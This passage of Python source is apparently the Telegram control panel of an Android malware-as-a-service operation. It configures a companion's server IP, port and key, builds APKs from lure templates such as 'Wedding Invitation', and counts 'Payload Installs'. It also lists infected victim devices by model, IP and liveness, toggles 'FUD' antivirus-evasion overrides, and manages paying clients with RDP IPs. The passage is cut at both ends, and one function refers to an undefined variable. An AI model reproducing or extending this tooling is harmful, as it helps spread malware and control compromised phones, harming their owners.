        "Type your No-IP domain:"
        + (f"\n\n<i>Current: <code>{cfg['ip']}</code></i>"
           if cfg and cfg.get("ip") and is_domain(cfg.get("ip", "")) else "") +
        "\n\n<i>Example: <code>monster.servemp3.com</code></i>"
    )


def kb_server_domain(client_id: int,
                      template: str) -> types.InlineKeyboardMarkup:
    """Domain input screen keyboard — Back to host type + Home."""
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back",
            callback_data=f"srv_back_to_host_type_{client_id}_{template}"),
        types.InlineKeyboardButton(
            "🏠 Home", callback_data="nav_home"),
    )
    return kb


def text_server_ip_prompt(client_id: int, template: str,
                          cfg: dict = None) -> str:
    """IP screen: show all current values + ask to keep or type new IP."""
    db = get_db()
    c  = db.execute(
        "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    db.close()
    name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
    emoji, tpl_name = TEMPLATES.get(template, ("⚙️", template.title()))
    if cfg is None:
        cfg = read_companion_server_config()
    if cfg["ip"] or cfg["port"] or cfg["key"]:
        current_line = (
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📌 <b>Current in companion:</b>\n"
            f"   📡 IP   : <code>{cfg['ip']   or '—'}</code>\n"
            f"   🔌 Port : <code>{cfg['port'] or '—'}</code>\n"
            f"   🔑 Key  : <code>{cfg['key']  or '—'}</code>\n"
        )
    else:
        current_line = ""
    return (
        f"🌐 <b>Server Config — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"Template: {emoji} {tpl_name}\n"
        + current_line +
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📡 <b>Server IP</b>\n"
        "Tap Keep or type a new IP:"
        + (f"\n\n<i>Current: <code>{cfg['ip']}</code></i>" if cfg.get("ip") else "") +
        "\n\n<i>Example: 192.168.1.100</i>"
    )


def text_server_port_prompt(ip: str, cfg: dict = None) -> str:
    """Port screen: show confirmed IP/Domain + ask to keep or type new port."""
    if cfg is None:
        cfg = read_companion_server_config()
    if is_domain(ip):
        _encoded = base64.b64encode(ip.encode()).decode()
        host_line = (
            f"🌐 Domain : <code>{ip}</code> ✅\n"
            f"🔐 Encoded: <code>{_encoded}</code>\n"
        )
    else:
        host_line = f"📡 IP   : <code>{ip}</code> ✅\n"
    return (
        "🌐 <b>Server Config</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        + host_line +
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔌 <b>Server Port</b>\n"
        "Tap Keep or type a new port:"
        + (f"\n\n<i>Current: <code>{cfg['port']}</code></i>" if cfg.get("port") else "") +
        "\n\n<i>Example: 7771</i>"
    )


def text_server_key_prompt(ip: str, port: str, cfg: dict = None) -> str:
    """Key screen: show confirmed IP/Domain+port + ask to keep or type new key."""
    if cfg is None:
        cfg = read_companion_server_config()
    if is_domain(ip):
        host_line = f"🌐 Domain : <code>{ip}</code> ✅\n"
    else:
        host_line = f"📡 IP     : <code>{ip}</code> ✅\n"
    return (
        "🌐 <b>Server Config</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        + host_line +
        f"🔌 Port   : <code>{port}</code> ✅\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔑 <b>Connection Key</b>\n"
        "Tap Keep or type a new key:"
        + (f"\n\n<i>Current: <code>{cfg['key']}</code></i>" if cfg.get("key") else "") +
        "\n\n<i>Example: MySecretKey123</i>"
    )


def kb_server_config_ip(client_id: int, template: str,
                        current_ip: str) -> types.InlineKeyboardMarkup:
    """IP screen: Keep current IP button + Back + Home."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    if current_ip:
        kb.add(types.InlineKeyboardButton(
            f"✅ Keep: {current_ip}",
            callback_data=f"srv_keep_ip_{client_id}_{template}"))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data=f"new_build_{client_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_server_config_port(client_id: int, template: str,
                          current_port: str) -> types.InlineKeyboardMarkup:
    """Port screen: Keep current port button + Back (→ IP screen) + Home."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    if current_port:
        kb.add(types.InlineKeyboardButton(
            f"✅ Keep: {current_port}",
            callback_data=f"srv_keep_port_{client_id}_{template}"))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data=f"srv_back_to_ip_{client_id}_{template}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_server_config_key(client_id: int, template: str,
                         current_key: str) -> types.InlineKeyboardMarkup:
    """Key screen: Keep current key button + Back (→ Port screen) + Home."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    if current_key:
        kb.add(types.InlineKeyboardButton(
            f"✅ Keep: {current_key}",
            callback_data=f"srv_keep_key_{client_id}_{template}"))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data=f"srv_back_to_port_{client_id}_{template}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_server_config_cancel(client_id: int,
                            template: str) -> types.InlineKeyboardMarkup:
    """Confirm screen: Back (→ Key screen) + Home."""
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back",
            callback_data=f"srv_back_to_key_{client_id}_{template}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_dev_test_config_start() -> types.InlineKeyboardMarkup:
    """First screen for dev test server config — build with current OR change values."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "✅ Build with Current Values", callback_data="dev_test_build_current"))
    kb.add(types.InlineKeyboardButton(
        "✏️ Change Values", callback_data="dev_test_change_values"))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="prod_test_build"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_dev_test_config_ip(current_ip: str) -> types.InlineKeyboardMarkup:
    """Dev test IP screen: Keep current IP + Back (→ start) + Home."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    if current_ip:
        kb.add(types.InlineKeyboardButton(
            f"✅ Keep: {current_ip}", callback_data="dev_test_keep_ip"))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="dev_test_config_back_to_start"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_dev_test_config_port(current_port: str) -> types.InlineKeyboardMarkup:
    """Dev test Port screen: Keep current port + Back (→ IP) + Home."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    if current_port:
        kb.add(types.InlineKeyboardButton(
            f"✅ Keep: {current_port}", callback_data="dev_test_keep_port"))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="dev_test_back_to_ip"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_dev_test_config_key(current_key: str) -> types.InlineKeyboardMarkup:
    """Dev test Key screen: Keep current key + Back (→ Port) + Home."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    if current_key:
        kb.add(types.InlineKeyboardButton(
            f"✅ Keep: {current_key}", callback_data="dev_test_keep_key"))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="dev_test_back_to_port"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_dev_test_config_cancel() -> types.InlineKeyboardMarkup:
    """Confirm screen back button — goes to Key screen."""
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="dev_test_back_to_key"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_dev_test_confirm() -> types.InlineKeyboardMarkup:
    """Confirm screen keyboard for dev test build."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "✅ Confirm & Build", callback_data="dev_test_confirm_build"))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="dev_test_back_to_key"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def text_dev_test_config_start(cfg: dict = None) -> str:
    """Dev test build: show current companion values + two options."""
    if cfg is None:
        cfg = read_companion_server_config()
    if cfg["ip"] or cfg["port"] or cfg["key"]:
        current_line = (
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📌 <b>Current in companion:</b>\n"
            f"   📡 IP   : <code>{cfg['ip']   or '—'}</code>\n"
            f"   🔌 Port : <code>{cfg['port'] or '—'}</code>\n"
            f"   🔑 Key  : <code>{cfg['key']  or '—'}</code>\n"
        )
    else:
        current_line = (
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ Could not auto-detect current companion values.\n"
        )
    return (
        "🌐 <b>Server Config — Dev Test Build</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💍 Wedding Invitation\n"
        + current_line +
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Build with current values or change them?"
    )


def text_dev_test_ip_prompt(cfg: dict = None) -> str:
    """Dev test: IP screen — show all current values + ask keep or type new IP."""
    if cfg is None:
        cfg = read_companion_server_config()
    if cfg.get("ip") or cfg.get("port") or cfg.get("key"):
        current_line = (
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📌 <b>Current in companion:</b>\n"
            f"   📡 IP   : <code>{cfg['ip']   or '—'}</code>\n"
            f"   🔌 Port : <code>{cfg['port'] or '—'}</code>\n"
            f"   🔑 Key  : <code>{cfg['key']  or '—'}</code>\n"
        )
    else:
        current_line = ""
    return (
        "🌐 <b>Server Config — Dev Test Build</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💍 Wedding Invitation\n"
        + current_line +
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📡 <b>Server IP</b>\n"
        "Tap Keep or type a new IP:"
        + (f"\n\n<i>Current: <code>{cfg['ip']}</code></i>" if cfg.get("ip") else "") +
        "\n\n<i>Example: 192.168.1.100</i>"
    )


def text_dev_test_port_prompt(ip: str, cfg: dict = None) -> str:
    """Dev test: Port screen — show confirmed IP + ask keep or type new port."""
    if cfg is None:
        cfg = read_companion_server_config()
    return (
        "🌐 <b>Server Config — Dev Test Build</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📡 IP   : <code>{ip}</code> ✅\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔌 <b>Server Port</b>\n"
        "Tap Keep or type a new port:"
        + (f"\n\n<i>Current: <code>{cfg['port']}</code></i>" if cfg.get("port") else "") +
        "\n\n<i>Example: 7771</i>"
    )


def text_dev_test_key_prompt(ip: str, port: str, cfg: dict = None) -> str:
    """Dev test: Key screen — show confirmed IP+port + ask keep or type new key."""
    if cfg is None:
        cfg = read_companion_server_config()
    return (
        "🌐 <b>Server Config — Dev Test Build</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📡 IP   : <code>{ip}</code> ✅\n"
        f"🔌 Port : <code>{port}</code> ✅\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔑 <b>Connection Key</b>\n"
        "Tap Keep or type a new key:"
        + (f"\n\n<i>Current: <code>{cfg['key']}</code></i>" if cfg.get("key") else "") +
        "\n\n<i>Example: MySecretKey123</i>"
    )


def text_builds_history(builds: list, client_name: str) -> str:
    lines = [
        f"📋 <b>Builds History — {client_name}</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Total Builds : {len(builds)}",
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    if not builds:
        lines.append("No builds yet.")
    else:
        for b in builds:
            emoji, tpl_name = TEMPLATES.get(b["template"], ("⚙️", b["template"]))
            status = "✅ Success" if b["status"] == "success" else "❌ Failed"
            dur    = format_secs(b["duration_secs"])
            date   = b["started_at"][:10] if b["started_at"] else "—"
            lines.append(
                f"<b>#{b['build_number']}</b> {emoji} {tpl_name}\n"
                f"  {status}  ·  {dur}  ·  {date}"
            )
    return "\n".join(lines)


def text_build_detail(b: dict, client_name: str) -> str:
    emoji, display_name = TEMPLATES.get(b["template"], ("⚙️", b["template"]))
    status              = "✅ SUCCESS" if b["status"] == "success" else "❌ FAILED"
    db                  = get_db()
    total_dev           = db.execute(
        "SELECT COUNT(*) as cnt FROM devices WHERE build_id=?",
        (b["id"],)).fetchone()["cnt"]
    active_dev          = db.execute(
        "SELECT COUNT(*) as cnt FROM devices "
        "WHERE build_id=? AND status='active'",
        (b["id"],)).fetchone()["cnt"]
    db.close()

    # Connection section — only show if at least IP is known
    ip   = b.get("server_ip") or ""
    port = b.get("server_port") or ""
    key  = b.get("server_key") or ""
    if ip:
        conn_section = (
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📡 <b>Connection</b>\n"
            f"IP       : <code>{ip}</code>\n"
            f"Port     : {port or '—'}\n"
            f"Key      : <code>{key or '—'}</code>\n"
        )
    else:
        conn_section = ""

    date_str = b['started_at'][:16] if b.get('started_at') else '—'

    return (
        f"📋 <b>Build #{b['build_number']}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"Client   : {client_name}\n"
        f"Template : {emoji} {display_name}\n"
        f"Status   : {status}\n"
        f"{conn_section}"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📦 <b>APK Info</b>\n"
        f"Package  : <code>{b.get('package_name') or '—'}</code>\n"
        f"Size     : {b.get('apk_size') or '—'}\n"
        f"Duration : {format_secs(b.get('duration_secs'))}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🕐 Date  : {date_str} UTC\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Devices : {total_dev} total  |  {active_dev} active"
    )


def text_devices(devices: list, build_num: int, template: str,
                 total: int, page: int, total_pages: int) -> str:
    emoji, display_name = TEMPLATES.get(template, ("⚙️", template))
    lines = [
        f"📱 <b>Devices — Build #{build_num}</b>",
        f"{emoji} {display_name}",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Total : {total}  |  Page : {page}/{total_pages}",
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    for i, d in enumerate(devices, (page - 1) * DEVICES_PER_PAGE + 1):
        se  = ("🟢" if d["status"] == "active"
               else "🟡" if d["status"] == "idle" else "🔴")
        ago      = time_ago(d["last_seen"])
        mfr      = d.get("manufacturer") or ""
        model    = d.get("model") or ""
        android  = d.get("android_version") or ""
        ip_addr  = d.get("ip") or "—"
        # Enrolled date: enrolled_at stored as unix int or ISO string
        raw_enr  = d.get("enrolled_at") or 0
        try:
            enr_ts   = int(raw_enr)
            enr_str  = datetime.utcfromtimestamp(enr_ts).strftime("%Y-%m-%d") if enr_ts else "—"
        except (ValueError, TypeError, OSError):
            enr_str  = str(raw_enr)[:10] if raw_enr else "—"
        # Device name line: "Samsung Galaxy S21 | Android 12"
        dev_name = " ".join(filter(None, [mfr, model])) or d['device_id'][:12]
        android_short = android.split(" (")[0] if android else "—"
        # FUD override indicator
        dev_fud  = d.get("fud_override", -1)
        if dev_fud is None:
            dev_fud = -1
        fud_str  = "" if int(dev_fud) == -1 else (" 🛡" if int(dev_fud) == 1 else " 🚫")
        lines.append(
            f"\n{i}. {se} <b>{dev_name}</b>{fud_str}\n"
            f"   {android_short}  |  IP: {ip_addr}\n"
            f"   Enrolled: {enr_str}  |  Seen: {ago}\n"
            f"   <code>{d['device_id']}</code>"
        )
    return "\n".join(lines)


def text_client_stats(c: dict) -> str:
    db             = get_db()
    total_builds   = db.execute(
        "SELECT COUNT(*) as cnt FROM builds WHERE client_id=?",
        (c["id"],)).fetchone()["cnt"]
    success_builds = db.execute(
        "SELECT COUNT(*) as cnt FROM builds "
        "WHERE client_id=? AND status='success'",
        (c["id"],)).fetchone()["cnt"]
    total_devices  = db.execute(
        "SELECT COUNT(*) as cnt FROM devices WHERE client_id=?",
        (c["id"],)).fetchone()["cnt"]
    cutoff         = int(time.time()) - 86400
    active_24h     = db.execute(
        "SELECT COUNT(*) as cnt FROM devices WHERE client_id=? "
        "AND last_seen > datetime(?, 'unixepoch')",
        (c["id"], cutoff)).fetchone()["cnt"]
    top            = db.execute(
        "SELECT template, COUNT(*) as cnt FROM builds WHERE client_id=? "
        "GROUP BY template ORDER BY cnt DESC LIMIT 1",
        (c["id"],)).fetchone()
    db.close()

    top_template = "—"
    if top:
        emoji, name  = TEMPLATES.get(top["template"],
                                     ("⚙️", top["template"]))
        top_template = f"{emoji} {name}"

    dead_devices = total_devices - active_24h
    name = c["profile_name"] or c["telegram_username"]
    return (
        f"📊 <b>Stats — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"Total Builds      : {total_builds}\n"
        f"Successful        : {success_builds}\n"
        f"Failed            : {total_builds - success_builds}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Payload Installs\n"
        f"Total Installs    : {total_devices}\n"
        f"Live  (last 24h)  : {active_24h} 🟢\n"
        f"Dead              : {dead_devices} 🔴\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"Top Template      : {top_template}\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )


def text_global_stats() -> str:
    db             = get_db()
    total_clients  = db.execute(
        "SELECT COUNT(*) as cnt FROM clients").fetchone()["cnt"]
    total_builds   = db.execute(
        "SELECT COUNT(*) as cnt FROM builds").fetchone()["cnt"]
    total_devices  = db.execute(
        "SELECT COUNT(*) as cnt FROM devices").fetchone()["cnt"]
    cutoff         = int(time.time()) - 86400
    active_24h     = db.execute(
        "SELECT COUNT(*) as cnt FROM devices "
        "WHERE last_seen > datetime(?, 'unixepoch')",
        (cutoff,)).fetchone()["cnt"]
    top            = db.execute(
        "SELECT template, COUNT(*) as cnt FROM builds "
        "GROUP BY template ORDER BY cnt DESC LIMIT 1"
    ).fetchone()
    last_build     = db.execute(
        "SELECT build_number, status FROM builds ORDER BY id DESC LIMIT 1"
    ).fetchone()
    db.close()

    top_template = "—"
    if top:
        emoji, name  = TEMPLATES.get(top["template"],
                                     ("⚙️", top["template"]))
        top_template = f"{emoji} {name}"

    last = "—"
    if last_build:
        st   = "✅" if last_build["status"] == "success" else "❌"
        last = f"#{last_build['build_number']} {st}"

    return (
        "📊 <b>Global Stats</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"Total Clients  : {total_clients}\n"
        f"Total Builds   : {total_builds}\n"
        f"Total Devices  : {total_devices}\n"
        f"Active (24h)   : {active_24h}\n"
        f"Top Template   : {top_template}\n"
        f"Last Build     : {last}\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )


def _get_deployed_commit() -> str:
    """Return the current git commit hash (short) of the running server code."""
    try:
        import subprocess
        result = subprocess.run(
            ["git", "-C", os.path.dirname(os.path.abspath(__file__)), "rev-parse", "--short", "HEAD"],
            capture_output=True, text=True, timeout=5
        )
        commit = result.stdout.strip()
        return commit if commit else "unknown"
    except Exception:
        return "unknown"


def text_server_status() -> str:
    services = [
        ("🤖 Telegram Bot",   "vaultguard_telegram"),
        ("🔗 Cloudflare Tunnel", "vaultguard_cloudflare"),
        ("♻️ Watchdog",        "vaultguard_mutation"),
    ]
    lines = [
        "🖥 <b>Server Status</b>",
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    for label, svc in services:
        icon = "✅ Running" if check_service_running(svc) else "🔴 Stopped"
        lines.append(f"{label} : {icon}")
    commit = _get_deployed_commit()
    lines += [
        "━━━━━━━━━━━━━━━━━━━━",
        f"📦 Commit : <code>{commit}</code>",
        f"🕐 UTC    : {utc_now()}",
    ]
    return "\n".join(lines)


def text_settings(chat_id: int) -> str:
    has_pin  = bool(getattr(config, "ADMIN_PIN",  None))
    has_2fa  = bool(getattr(config, "TOTP_SECRET", None))
    pin_st   = "✅ Set" if has_pin  else "⚠️ Not set"
    tfa_st   = "✅ Set" if has_2fa  else "⚠️ Not set"
    return (
        "⚙️ <b>Settings</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🔐 PIN           : {pin_st}\n"
        f"🔑 2FA Secret    : {tfa_st}\n"
        f"🔒 Session       : {session_remaining(chat_id)} remaining\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🚦 Production Control manages builds & deployments."
    )


def text_add_client_form(data: dict, current_field: str,
                         error: str = "") -> str:
    # Step counter
    step_map = {"name": 1, "tg_id": 2, "rdp_ip": 3, "username": 4}
    step = step_map.get(current_field, 1)
    total = 4

    fields = [
        ("name",     "Profile Name",         data.get("name", "") or "—", True),
        ("tg_id",    "Telegram ID",          data.get("tg_id", ""),        True),
        ("rdp_ip",   "RDP IP Address",       data.get("rdp_ip", ""),       True),
        ("username", "Telegram Username",    data.get("username", ""),     False),
    ]
    prompts = {
        "name":     "✏️ Send profile name (e.g. Txmod):",
        "tg_id":    "✏️ Send Telegram ID (numbers only):",
        "rdp_ip":   "✏️ Send RDP IP address (e.g. 192.168.1.1):",
        "username": "✏️ Send Telegram username (without @), or send  .  to skip:",
    }

    lines = [
        f"➕ <b>Add Client</b>  — Step {step}/{total}",
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    for key, label, value, required in fields:
        req_tag = "" if required else " <i>(optional)</i>"
        if key == current_field:
            lines.append(f"➡️ <b>{label}</b>{req_tag}: ___")
        else:
            if value and value != "—":
                lines.append(f"✅ {label}: <code>{value}</code>")
            else:
                lines.append(f"⬜ {label}{req_tag}: —")
    lines.append("━━━━━━━━━━━━━━━━━━━━")
    if error:
        lines.append(f"⚠️ <b>{error}</b>")
    lines.append(prompts.get(current_field, ""))
    return "\n".join(lines)


def kb_add_client_cancel() -> types.InlineKeyboardMarkup:
    """Cancel button shown on every Add Client form step."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("❌ Cancel", callback_data="nav_clients"))
    return kb


def kb_edit_client_cancel(client_id: int) -> types.InlineKeyboardMarkup:
    """Cancel button shown on every Edit Client field step."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "❌ Cancel", callback_data=f"edit_client_{client_id}"))
    return kb


def text_edit_client_field(c: dict, field: str, error: str = "") -> str:
    """Prompt screen for editing one field of a client."""
    name = c.get("profile_name") or c.get("telegram_username", "?")
    field_labels = {
        "name":     ("👤 Profile Name",  c.get("profile_name") or "—"),
        "username": ("🔗 Username",      f"@{c.get('telegram_username', '')}"),
        "tg_id":    ("🆔 Telegram ID",   c.get("telegram_id", "")),
        "rdp_ip":   ("🖥 RDP IP",        c.get("rdp_ip", "")),
    }
    prompts = {
        "name":     "Send new profile name (or . to clear):",
        "username": "Send new Telegram username (without @):",
        "tg_id":    "⚠️ Send new Telegram ID (numeric).\nWarning: changing this may affect linked devices.",
        "rdp_ip":   "Send new RDP IP address (e.g. 192.168.1.1):",
    }
    label, current = field_labels.get(field, ("?", "?"))
    lines = [
        f"✏️ <b>Edit Client — {name}</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Field   : {label}",
        f"Current : <code>{current}</code>",
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    if error:
        lines.append(f"⚠️ <b>{error}</b>")
    lines.append(prompts.get(field, "Send new value:"))
    return "\n".join(lines)


def text_edit_client_menu(c: dict) -> str:
    """Edit menu showing all current field values."""
    name = c.get("profile_name") or c.get("telegram_username", "?")
    return (
        f"✏️ <b>Edit Client — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Profile Name : {c.get('profile_name') or '—'}\n"
        f"🔗 Username     : @{c.get('telegram_username', '')}\n"
        f"🆔 Telegram ID  : <code>{c.get('telegram_id', '')}</code>\n"
        f"🖥 RDP IP       : <code>{c.get('rdp_ip', '')}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Select a field to edit:"
    )


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 9 — NAVIGATION HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def safe_edit(chat_id, message_id, text, reply_markup=None):
    """Edit message in-place — falls back to send_message for document/media messages."""
    try:
        bot.edit_message_text(
            text, chat_id, message_id,
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    except Exception as e:
        err = str(e).lower()
        if "message is not modified" in err:
            return  # silent — no change needed
        # Telegram rejects edit_message_text on document/media messages.
        # Fall back to sending a new message so buttons always respond.
        _non_editable = (
            "there is no text in the message" in err
            or "message can't be edited" in err
            or "message to edit not found" in err
            or "chat not found" in err
            or "button_data_invalid" in err
        )
        if _non_editable:
            try:
                bot.send_message(
                    chat_id, text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            except Exception as e2:
                log.warning(f"safe_edit fallback send error: {e2}")
        else:
            log.warning(f"edit_message error: {e}")


def show_main(chat_id, message_id):
    safe_edit(chat_id, message_id, text_main(chat_id), kb_main())


def show_clients(chat_id, message_id):
    db      = get_db()
    clients = [dict(c) for c in db.execute(
        "SELECT * FROM clients ORDER BY id DESC").fetchall()]
    db.close()
    safe_edit(chat_id, message_id, text_clients(clients), kb_clients(clients))


def show_client_detail(chat_id, message_id, client_id):
    db = get_db()
    c  = db.execute(
        "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    db.close()
    if not c:
        safe_edit(chat_id, message_id, "❌ Client not found.", kb_home_only())
        return
    safe_edit(chat_id, message_id,
              text_client_detail(dict(c)),
              kb_client_detail(client_id,
                               active=bool(c["active"]),
                               vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
                               killed=int(c["killed"] if "killed" in c.keys() else 0),
                               expire_ts=int(c["expire_ts"] if "expire_ts" in c.keys() else 0)))


def show_builds_history(chat_id, message_id, client_id):
    db     = get_db()
    c      = db.execute(
        "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    builds = [dict(b) for b in db.execute(
        "SELECT * FROM builds WHERE client_id=? ORDER BY id DESC LIMIT 20",
        (client_id,)).fetchall()]
    db.close()
    if not c:
        safe_edit(chat_id, message_id, "❌ Client not found.", kb_home_only())
        return
    name = c["profile_name"] or c["telegram_username"]
    safe_edit(chat_id, message_id,
              text_builds_history(builds, name),
              kb_builds_history(builds, client_id))


def show_build_detail(chat_id, message_id, build_id):
    db = get_db()
    b  = db.execute(
        "SELECT * FROM builds WHERE id=?", (build_id,)).fetchone()
    if not b:
        db.close()
        safe_edit(chat_id, message_id, "❌ Build not found.", kb_home_only())
        return
    c    = db.execute(
        "SELECT * FROM clients WHERE id=?", (b["client_id"],)).fetchone()
    db.close()
    name         = c["profile_name"] or c["telegram_username"] if c else "Unknown"
    fud_override = int(b["fud_override"]) if b["fud_override"] is not None else -1
    safe_edit(chat_id, message_id,
              text_build_detail(dict(b), name),
              kb_build_detail(build_id, b["client_id"], fud_override))


def show_devices(chat_id, message_id, build_id, page):
    db    = get_db()
    b     = db.execute(
        "SELECT * FROM builds WHERE id=?", (build_id,)).fetchone()
    if not b:
        db.close()
        safe_edit(chat_id, message_id, "❌ Build not found.", kb_home_only())
        return
    total   = db.execute(
        "SELECT COUNT(*) as cnt FROM devices WHERE build_id=?",
        (build_id,)).fetchone()["cnt"]
    offset  = (page - 1) * DEVICES_PER_PAGE
    devices = [dict(d) for d in db.execute(
        "SELECT * FROM devices WHERE build_id=? "
        "ORDER BY id DESC LIMIT ? OFFSET ?",
        (build_id, DEVICES_PER_PAGE, offset)).fetchall()]
    db.close()
    total_pages = max(1, (total + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
    safe_edit(
        chat_id, message_id,
        text_devices(devices, b["build_number"], b["template"],
                     total, page, total_pages),
        kb_devices(build_id, page, total_pages, devices)
    )


def show_device_detail(chat_id, message_id, row_id: int):
    db = get_db()
    d  = db.execute(
        "SELECT * FROM devices WHERE id=?", (row_id,)).fetchone()
    if not d:
        db.close()
        safe_edit(chat_id, message_id, "❌ Device not found.", kb_home_only())
        return
    d = dict(d)
    db.close()
    mfr      = d.get("manufacturer") or "—"
    model    = d.get("model") or "—"
    android  = d.get("android_version") or "—"
    template = d.get("template") or "—"
    ip_addr  = d.get("ip") or "—"
    raw_enr  = d.get("enrolled_at") or 0
    try:
        enr_ts  = int(raw_enr)
        enr_str = datetime.utcfromtimestamp(enr_ts).strftime("%Y-%m-%d %H:%M") if enr_ts else "—"
    except (ValueError, TypeError, OSError):
        enr_str = str(raw_enr)[:16] if raw_enr else "—"
    se       = ("🟢" if d["status"] == "active"
                else "🟡" if d["status"] == "idle" else "🔴")
    ago      = time_ago(d["last_seen"])
    dev_fud  = d.get("fud_override", -1)
    if dev_fud is None:
        dev_fud = -1
    dev_fud  = int(dev_fud)
    if dev_fud == 1:
        fud_label = "🛡 FUD: ON (this device)"
        fud_btn   = f"🚫 Turn FUD OFF (this device)"
    elif dev_fud == 0:
        fud_label = "🚫 FUD: OFF (this device)"
        fud_btn   = f"🛡 Turn FUD ON (this device)"
    else:
        fud_label = "📋 FUD: Inherit from build"
        fud_btn   = f"🛡 Override FUD ON  |  🚫 Override FUD OFF"
    build_id = d.get("build_id", 0)
    text = (
        f"📱 <b>Device Detail</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"Status    : {se} {d['status'].capitalize()}\n"
        f"Maker     : {mfr}\n"
        f"Model     : {model}\n"
        f"Android   : {android}\n"
        f"Template  : {template}\n"
        f"IP        : {ip_addr}\n"
        f"Enrolled  : {enr_str} UTC\n"
        f"Last Seen : {ago}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"FUD       : {fud_label}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>{device_id}</code>"
    )
    kb = types.InlineKeyboardMarkup(row_width=1)
    if dev_fud == -1:
        # Inherit — offer both ON and OFF overrides
        kb.add(types.InlineKeyboardButton(
